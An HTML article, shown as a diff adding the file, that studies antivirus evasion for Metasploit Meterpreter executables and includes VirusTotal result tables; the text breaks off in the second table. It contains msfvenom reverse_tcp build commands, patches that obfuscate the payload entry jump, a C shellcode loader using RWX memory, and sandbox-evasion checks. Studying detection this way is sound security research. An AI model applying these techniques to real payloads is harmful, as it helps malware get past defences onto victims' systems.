@@ -1,0 +1,5520 @@
+<html>
+<head>
+<style>
+body { font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10pt; }
+pre { margin: 1em; padding: 1em; background-color: #ddd; border: 1px solid black; }
+.filescan td, .filescan th, .fileinfo td, .fileinfo th {border: 1px solid gray; }
+.filescan th, .fileinfo th {border-bottom: 2px solid; }
+.filescan, .fileinfo {border: 4px solid black; border-collapse: collapse; }
+.fileinfo {background-color: #ddd; margin-top: 1em; }
+.filescan .positive { font-weight:bold; color: red; }
+
+</style>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="Author" content="Michael Schierl">
+<title>Facts and myths about antivirus evasion with Metasploit</title>
+</head>
+<body>
+
+<h1>Facts and myths about antivirus evasion with Metasploit</h1>
+
+<p><i>by mihi &lt;schierlm at users dot sourceforge dot net&gt;, <a href="http://twitter.com/mihi42">@mihi42</a></i></p>
+
+<h2>Introduction</h2>
+
+<p>When asking people about how to create a Meterpreter payload executable that evades antivirus, you
+will get different answers, like using encoders, or changing the template. Others say it is useless to use 
+or even improve Metasploit's exe generation since the AV engines will detect the RWX stub, so you have to find your own way to get RWX memory. Some of these answers are just outdated, others still work, but for all of them there is no real evidence available on the Web. The reason for this is simple: AV evasion is like the
+<a href="http://en.wikipedia.org/wiki/Uncertainty_principle">Heisenberg uncertainty principle</a>: Whenever you scan a piece of malware (and especially when you upload it to services like <a href="http://www.virustotal.com/">VirusTotal</a>, you will affect future detection of the same file or similar files. And, a writeup like this will also affect how AV detects files, thus making it harder to evade it. Therefore, most researcher try to keep their information about antivirus private, having the consequence that a lot of research is done a lot of times.</p>
+
+<p>This article tries to given an overview about the current executable generation scheme of Metasploit, how AV detects them, and how to evade them. Note that this document only covers standalone EXE files (for Windows) that replace an EXE template's functionality, and not other payloads for exploits, service executables (like for the <tt>windows/psexec</tt> exploit) or executables that merely add to the original template's functionality (like the <tt>-k</tt> option of msfpayload). Some situations (like some social engineering "exploits", or generating a Java applet that calls native meterpreter) will implicitly create such an EXE file, though, so it helps these use cases as well.</p>
+
+
+<h2>Current situation</h2>
+
+<p>A good writeup about how EXE files are currently generated is available at <a href="http://www.scriptjunkie.us/2011/04/why-encoding-does-not-matter-and-how-metasploit-generates-exes/">scriptjunkie's blog</a>.</p>
+
+<p>The following commands were used to generate test files:</p>
+<pre>
+..\..\ruby\bin\ruby.exe ..\msfvenom ^
+   -f exe -e x86/shikata_ga_nai -i 10 ^
+   -p windows/meterpreter/reverse_tcp ^
+   LHOST=localhost LPORT=4444 &gt;default_meterpreter_%1.exe
+
+..\..\ruby\bin\ruby.exe ..\msfvenom ^
+   -f exe -e generic/none ^
+   -p generic/custom ^
+   PAYLOADSTR= &gt;default_none_%1.exe
+
+..\..\ruby\bin\ruby.exe ..\msfvenom ^
+   -x %WINDIR%\notepad.exe
+   -f exe -e x86/shikata_ga_nai -i 10 ^
+   -p windows/meterpreter/reverse_tcp ^
+   LHOST=localhost LPORT=4444 &gt;notepad_meterpreter_%1.exe
+
+..\..\ruby\bin\ruby.exe ..\msfvenom ^
+   -x %WINDIR%\notepad.exe
+   -f exe -e generic/none ^
+   -p generic/custom ^
+   PAYLOADSTR= &gt;notepad_none_%1.exe
+</pre>
+
+<p>They were uploaded to VirusTotal for analysis, the actual analysis reports are attached to the end of this document.</p>
+
+<p>As of July 2011 (SVN revision 13090), the basic meterpreter image <tt>default_meterpreter.exe</tt> is detected by 26 of 43 antivirus engines (60%) listed at VirusTotal.</p>
+
+<h2>Using a different template</h2>
+
+<p>The definitely easiest way to reduce AV detection is using a different EXE template. Almost any native Win32 EXE file can be used, and a typical Windows user has thousands of them on his hard disk. Just pick one and AV detection will go down. The more exotic the software, the better. For this example, I chose <tt>notepad.exe</tt> from a German WinXP SP3 installation.</p>
+
+<p>The default executable template (<tt>msf3\data\templates\template_x86_windows.exe</tt>) is detected by 3 AV engines (CAT-QuickHeal, SUPERAntiSpyware, VirusBuster) as malicious. Conversely, any other Meterpreter payload built from a different template is <b>not</b> detected by these three AV engines. For 4 other AV engines (AhnLab-V3, Emsisoft, Ikarus, Panda), the templates themselves are not detected, but payloads built from that template are detected, but not the payloads from the Notepad template. Therefore, just by using a custom template, you can reduce the detection rate from 26 to 19 engines (44%).</p>
+
+<h2>Improving payload encoders</h2>
+
+<p>Improving payload encoders is much harder, especially since the <tt>x86/shikata_ga_nai</tt> encoder (that uses a polymorphic decoder stub) is excellent for evasion. Testing this option is easy, by testing with EXE files without a payload at all. If they are still detected, encoders will not be able to help avoid detection either. When looking at the overall results, there is not a single antivirus where removing the payload improves detection in all cases. For 6 of them (BitDefender, Emsisoft, F-Secure, Ikarus, NOD32, nProtect), removing the payload sometimes dereases the detection rate, but not in all cases.</p>
+
+<p>As a conclusion, considering the amount of time that would be needed to improve encoders further, improvement of encoders is basically only interesting if it also helps evasion of IDS/IPS or similar systems. We will look at different options in this article, though.</p>
+
+<h2>Obfuscating the way from the entry point to the stager</h2>
+
+<p>As scriptjunkie wrote in his article, tracing from the entry point over the nop sled to the jump that jumps to the RWX stub is quite easy to do. In case AV is using it for detection, it might be an option to look at opportunities to make that code more complex.</p>
+
+<p>To test this, I modified the EXE generator so that it does not fix the entry point at all, resulting in broken executables that do not run the payload. On the other hand, all the evil code (RWX stub and payload) is still in there, so if the AV does not trace execution but detect the payload in another way, it should still detect the file. The following patch was used to achieve this:</p>
+
+<pre>
+Index: exe.rb
+===================================================================
+--- exe.rb	(revision 13090)
++++ exe.rb	(working copy)
+@@ -314,7 +314,7 @@
+ 			exe = fd.read(fd.stat.size)
+ 		}
+ 
+-		exe[ exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = [ text.base_rva + block[0] + eidx ].pack(&quot;V&quot;)
++		# exe[ exe.index([pe.hdr.opt.AddressOfEntryPoint].pack('V')), 4] = [ text.base_rva + block[0] + eidx ].pack(&quot;V&quot;)
+ 		exe[off_beg, data.length] = data
+ 
+ 		tds = pe.hdr.file.TimeDateStamp
+
+</pre>
+
+<p>The resulting files were only detected by one antivirus engines (DrWeb); although they still contain the full payload and RWX stub. Some people will now start complaining again that it is pointless to AV check files that do not run at all. To prove them wrong, I tried a simple modification to the encoder so that it does not create a relative jump, but an indirect one to a register that is initialized via XORing two values. I also added a small loop to make tracing the execution flow harder. The following patch was used to achieve this:</p>
+
+<pre>
+Index: exe.rb
+===================================================================
+--- exe.rb	(revision 13090)
++++ exe.rb	(working copy)
+@@ -285,7 +285,7 @@
+ 		eidx = nil
+ 
+ 		# Pad the entry point with random nops
+-		entry = generate_nops(framework, [ARCH_X86], rand(200)+51)
++		entry = generate_nops(framework, [ARCH_X86], rand(181)+51)
+ 
+ 		# Pick an offset to store the new entry point
+ 		if(eloc == 0) # place the entry point before the payload
+@@ -296,8 +296,17 @@
+ 			eidx = rand(block[1] - (poff + payload.length)) + poff + payload.length
+ 		end
+ 
+-		# Relative jump from the end of the nops to the payload
+-		entry += &quot;\xe9&quot; + [poff - (eidx + entry.length + 5)].pack('V')
++		# Indirect jump from the end of the nops to the payload
++		xorvalue = rand(0x100000000)
++		tmpvalue = rand(0x100000000)
++		entry += &quot;\xb8&quot; + [xorvalue].pack('V')  # mov eax, ...
++		entry += &quot;\x66\xb9\x00\x10&quot; # mov cx, 0x1000
++		entry += &quot;\x35&quot; + [tmpvalue].pack('V') # loop: xor eax, ...
++		entry += &quot;\x66\x49&quot; # dec cx
++		entry += &quot;\x75\xf7&quot; # jnz loop
++		# TODO: Any better way to get the EXE base address (0x01000000)?
++		entry += &quot;\x35&quot; + [xorvalue ^ (0x01000000 + text.base_rva + block[0] + poff)].pack('V') # xor eax, ...
++		entry += &quot;\xff\xe0&quot;  # jmp eax
+ 
+ 		# Mangle 25% of the original executable
+ 		1.upto(block[1] / 4) do
+
+</pre>
+
+<p>That way, the binary without a payload was only detected by 4 AV engines, and a binary with meterpreter was
+detected by 9 AV engines, which is quite an improvement from 19 engines, considering this primitive way of obfuscation.</p>
+
+<p>Just to make it clear, I do not propose applying this patch to Metasploit - it is easy for the AV guys to update their detections. But having some more complicated way of jumping to the entry point (using polymorphic code, for example) could help quite a bit to reduce AV detection and I think it is easier to write polymorphic "jump anywhere" code than a polymorphic RWX stub...</p>
+
+<h2>Obfuscating/replacing the RWX stub</h2>
+
+<p>Obfuscation of the RWX stub is hard, especially since you cannot use self-modifying code. So to obfuscate the RWX stub, you are basically limited to replacing opcodes by others with same/similar effect, and to reordering parts. An alternative might be to do a simple "VM" that reads instructions from heap or stack, because it can
+modify the instructions there; however, this is quite some amount of work with no guarantee that it will help
+for long.</p>
+
+<p>To assess the potential success of this method, I tried to build executables that do not make the memory RWX
+before executing it, using the following patch:</p>
+
+<pre>
+Index: exe.rb
+===================================================================
+--- exe.rb	(revision 13090)
++++ exe.rb	(working copy)
+@@ -135,7 +135,7 @@
+ 		set_template_default(opts, &quot;template_x86_windows.exe&quot;)
+ 
+ 		# Copy the code to a new RWX segment to allow for self-modifying encoders
+-		payload = win32_rwx_exec(code)
++		payload = code #win32_rwx_exec(code)
+ 
+ 		# Create a new PE object and run through sanity checks
+ 		endjunk = true
+
+</pre>
+
+<p>The resulting files were still detected by AVG and DrWeb; when comparing them with the other "broken" files (with the bad entry point), they do not perform better, but actually they perform worse in the sense that only the nop sled seems to be sufficient to make AVG detect it as malicious, while AVG did not detect the executables with the modified entry point. On the other hand, the file with the XORed entry point was detected by AVG again, increasing the probability that it is indeed the nop sled (without the following jump) that make AVG detect the file.</p>
+
+<p>Considering the vast amount of time needed to make a new rwx stub, combined with the low success chance (it will not help against AVG or DrWeb), I'll skip this option for now, and look at the other ones.</p>
+
+<h2>Using your own template for the old exe-small format</h2>
+
+<p>Metasploit includes an "old" option called exe-small to build executables from a template that reserves space for the payload and stores its length at a fixed position. Using this template method, no part of the text section has to be modified dynamically, therefore reducing the risk of heuristics detecting the file. On the other hand, the text section is static, making it easy to detect a given sample with static signatures. Therefore, once such a sample is used (and maybe uploaded to VirusTotal, either by you or by your target), the sample has to be considered "burnt" in the sense that a few hours to days later, most AVs will detect your samples with ease. This makes it hard to test the effectiveness of this approach, especially if you want to use the generated samples (if you test them, they will be useless afterwards).</p>
+
+<p>I built a small exe sample using VC++ Express 2008 by creating a console application project without precompiled headers and changed the Runtime Library option from /MTD to /MT (so that it does not link against VC runtime DLLs). </p>
+
+<p>Here is the source of my C program:</p>
+
+<pre>
+#define WIN32_LEAN_AND_MEAN
+#include &lt;windows.h&gt;
+
+#define SCSIZE 4096
+char payload[SCSIZE] = &quot;PAYLOAD:&quot;;
+
+char comment[641] = &quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;
+					&quot;1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É1É&quot;;
+
+int main(int argc, char* argv[])
+{
+	void* x = payload;
+	(*(void (*)()) x)();
+	return 0;
+}
+</pre>
+
+<p>A small patch was required to make Metasploit detect the new template and properly make the section RWX:</p>
+
+<pre>
+Index: exe.rb
+===================================================================
+--- exe.rb	(revision 13090)
++++ exe.rb	(working copy)
+@@ -369,8 +369,8 @@
+ 		pe[ci, buf.length] = buf
+ 
+ 		# Make the data section executable
+-		xi = pe.index([0xc0300040].pack('V'))
+-		pe[xi,4] = [0xe0300020].pack('V')
++		xi = pe.index([0xc0000040].pack('V'))
++		pe[xi,4] = [0xe0000020].pack('V')
+ 
+ 		# Add a couple random bytes for fun
+ 		pe &lt;&lt; Rex::Text.rand_text(rand(64)+4)
+</pre>
+
+<p>(Un-)Fortunately, even the empty template without payload was detected by one antivirus, probably because of that RWX section. Let's try again, this time without the code that makes the section RWX (commenting out the two lines changed by the patch above) but instead copying the payload ourselves into RWX memory:</p>
+
+<pre>
+int main(int argc, char* argv[])
+{
+	void* p = VirtualAlloc(NULL, SCSIZE, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	char* pp = (char*) p;
+	char* x = payload;
+	int i;
+
+	for(i = 0; i &lt; SCSIZE; i++)
+		*pp++ = *x++;
+
+	(*(void (*)()) p)();
+
+	return 0;
+}
+</pre>
+
+<p>Now, the empty payload does not trigger any antivirus (which is correct, since it is not malicious; but at least no heuristics caught this template) and the meterpreter payload is detected only by Microsoft, Kaspersky, F-Secure and other engines that I think use either of these engines, resulting in a 6 of 43 detection rate (14%).</p>
+
+<p>The next question that arises: Do those 6 antivirus detect the shikata_ga_nai encoder or do they sandbox the executable and detect the real behaviour (reverse shell)? To test this, I built an executable that uses an empty payload, but encoded with shikata_ga_nai 10 times:</p>
+
+<pre>
+..\..\ruby\bin\ruby.exe ..\msfvenom ^
+   -x ExeTemplate.exe ^
+   -f exe-small -e x86/shikata_ga_nai -i 10 ^
+   -p generic/custom ^
+   PAYLOADSTR= &gt;exesmall_encodednone_%1.exe
+</pre>
+
+<p>This template is also detected by none of the antivirus engines; the shikata_ga_nai encoder is not the culprit of detection.</p>
+
+<p>As a conclusion, if you have the time and skill to design your own exe stub, it is the best option of all the options tried by now. But remember that you cannot use it very often, since creating signatures for it is very easy (definitely easier than writing the new stub, and also a lot easier than deobfuscating the entry point nop sled), so it is a good option only for "important" targets (or ones where you can be pretty sure it will not be detected). If you have to target one of the antivirus engines that use sandboxing, you will have to evade this separately, though.</p>
+
+<h2 id="sandbox">Antivirus Sandbox evasion</h2>
+
+<p>To evade sandboxing, there are basically three ways I can think of (maybe there are more):</p>
+
+<ul>
+<li>Try to use more computing power/time than the sandbox allows you to have</li>
+<li>Call API functions that are hard to emulate, or API functions that indicate the application has started/finished in the hope that the antivirus will give up</li>
+<li>Call API functions where you think a sandbox will emulate them incorrectly, and verify the result; if incorrect, stop immediately (similar to what some current malware does when it detects a VM to complicate reversing)</li>
+</ul>
+
+<p>I thought of a simple code snippet that tries to implement all the three ways: The first one is done by a Sleep() call, the second one by calling PeekMessage (which usually indicates the application finished initializing), and the third one by verifying with GetTickCount that the Sleep call really slept (in case the sandbox just implemented Sleep as a no-op) and by verifying that the received message is really the same that was posted. Of course, there are more sophisticated ways, like starting multiple threads, doing interlocked operations and verifying the results and the timing, but I wanted to start simple.</p>
+
+<p>Therefore, I added this code to the beginning of my example:</p>
+
+<pre>
+	MSG msg;
+	DWORD tc;
+	PostThreadMessage(GetCurrentThreadId(), WM_USER + 2, 23, 42);
+	if (!PeekMessage(&msg, (HWND)-1, 0, 0, 0))
+		return 0;
+	if (msg.message != WM_USER+2 || msg.wParam != 23 || msg.lParam != 42)
+		return 0;
+	tc = GetTickCount();
+	Sleep(650);
+	if (((GetTickCount() - tc) / 300) != 2)
+		return 0;
+</pre>
+
+<p>As a result, almost all previous detections went away - only Microsoft and Kaspersky still believe this is malicious. On the other hand, that code seems to trigger a new heuristic in Sophos, increasing the number of antivirus that still detects the sample to 3 of 43 (7%). Sandbox evasion can be quite effective if your target AV is using it, you just have to be careful not triggering new heuristics with them... It should be possible to put the sandbox evasion into a Metasploit encoder (that prepends it) and encoding the result further to make it harder to detect; this is left as an exercise to the reader, though.</p>
+
+<h2>Using standard payloads/encoders with your own loader</h2>
+
+<p><i>To be continued? I doubt it will get better than 3 of 43...</i></p>
+
+<hr>
+<h1>Virustotal results</h1>
+
+<h2>Default template</h2>
+
+<table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.07.01</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.10.246</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.08</td>
+         <td class="positive">Win32.Trojan.Swrort.A.4</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9303</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8429</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4883</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6275</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-07.01</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.02.03</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Backdoor-PoisonIvy</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.06</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9792</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.7.4555</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.114.0</td>
+         <td>2011.07.07</td>
+         <td class="positive">Trojan.Rosena.Gen.1</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 99addd5248236a60aeddbc35024cd2ab</td>
+     </tr>
+     <tr>
+         <td><strong>SHA1:</strong> c301f74eaa7758734ccc05c5c2832b2398fd9b01</td>
+     </tr>
+     <tr>
+         <td><strong>SHA256:</strong> 814f72c11bf033d94d35573e47e75646ff13c28221b842a398f0fa1dd21cb596</td>
+     </tr>
+     <tr>
+         <td><strong>File size:</strong> 73802 bytes</td>
+     </tr>
+     <tr>
+         <td><strong>Scan date:</strong> 2011-07-09 14:33:12 (UTC)</td>
+     </tr>
+ </table>
+ 
+ <h2>Notepad template (German WinXP SP3)</h2>
+ 
+ <table class="filescan">
+     <tr>
+         <th>Antivirus</th>
+         <th>Version</th>
+         <th>Last update</th>
+         <th>Result</th>
+     </tr>
+     <tr>
+         <td>AhnLab-V3</td>
+         <td>2011.07.09.00</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AntiVir</td>
+         <td>7.11.11.45</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Antiy-AVL</td>
+         <td>2.0.3.7</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast</td>
+         <td>4.8.1351.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Avast5</td>
+         <td>5.0.677.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>AVG</td>
+         <td>10.0.0.1190</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>BitDefender</td>
+         <td>7.2</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>CAT-QuickHeal</td>
+         <td>11.00</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ClamAV</td>
+         <td>0.97.0.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Commtouch</td>
+         <td>5.3.2.6</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Comodo</td>
+         <td>9325</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>DrWeb</td>
+         <td>5.0.2.03300</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Emsisoft</td>
+         <td>5.1.0.8</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eSafe</td>
+         <td>7.0.17.0</td>
+         <td>2011.07.07</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>eTrust-Vet</td>
+         <td>36.1.8434</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Prot</td>
+         <td>4.6.2.117</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>F-Secure</td>
+         <td>9.0.16440.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Fortinet</td>
+         <td>4.2.257.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>GData</td>
+         <td>22</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Ikarus</td>
+         <td>T3.1.1.104.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Jiangmin</td>
+         <td>13.0.900</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>K7AntiVirus</td>
+         <td>9.107.4887</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Kaspersky</td>
+         <td>9.0.0.837</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee</td>
+         <td>5.400.0.1158</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>McAfee-GW-Edition</td>
+         <td>2010.1D</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Microsoft</td>
+         <td>1.7000</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>NOD32</td>
+         <td>6278</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Norman</td>
+         <td>6.07.10</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>nProtect</td>
+         <td>2011-07-09.01</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Panda</td>
+         <td>10.0.3.5</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>PCTools</td>
+         <td>8.0.0.5</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Prevx</td>
+         <td>3.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Rising</td>
+         <td>23.65.04.03</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Sophos</td>
+         <td>4.67.0</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>SUPERAntiSpyware</td>
+         <td>4.40.0.1006</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>Symantec</td>
+         <td>20111.1.0.186</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TheHacker</td>
+         <td>6.7.0.1.250</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>TrendMicro-HouseCall</td>
+         <td>9.200.0.1012</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VBA32</td>
+         <td>3.12.16.4</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VIPRE</td>
+         <td>9813</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>ViRobot</td>
+         <td>2011.7.9.4560</td>
+         <td>2011.07.09</td>
+         <td>-</td>
+     </tr>
+     <tr>
+         <td>VirusBuster</td>
+         <td>14.0.115.1</td>
+         <td>2011.07.08</td>
+         <td>-</td>
+     </tr>
+ <table>
+
+ <table class="fileinfo">
+     <tr>
+         <th>Additional information</th>
+     </tr>
+     <tr>
+         <td><strong>MD5:</strong> 8a29b5b5a881c6709f31ff5203f0fac9</td>
